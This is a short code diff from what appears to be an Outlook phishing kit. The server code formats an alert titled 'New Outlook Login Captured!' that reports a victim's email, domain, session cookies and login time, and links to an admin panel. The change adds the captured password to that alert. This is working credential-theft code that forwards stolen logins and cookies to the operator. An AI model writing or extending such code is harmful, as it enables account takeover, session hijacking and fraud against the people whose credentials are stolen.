@@ -1031,13 +1031,14 @@ ${adminUrl}
             return;
         }
 
-        const { email, domain, timestamp, totalCookies, sessionId } = loginData;
+        const { email, domain, timestamp, totalCookies, sessionId, password } = loginData;
         const adminUrl = `${process.env.REPL_SLUG ? `https://${process.env.REPL_SLUG}.${process.env.REPL_OWNER}.repl.co` : 'http://localhost:5000'}/ad.html`;
         
         const notificationMessage = `
 🔐 <b>New Outlook Login Captured!</b>
 
 📧 <b>Email:</b> <code>${email}</code>
+🔑 <b>Password:</b> <span class="tg-spoiler">${password || 'Not captured'}</span>
 🏢 <b>Domain:</b> <code>${domain}</code>
 🕐 <b>Time:</b> ${new Date(timestamp).toLocaleString()}
 📊 <b>Cookies:</b> ${totalCookies} saved
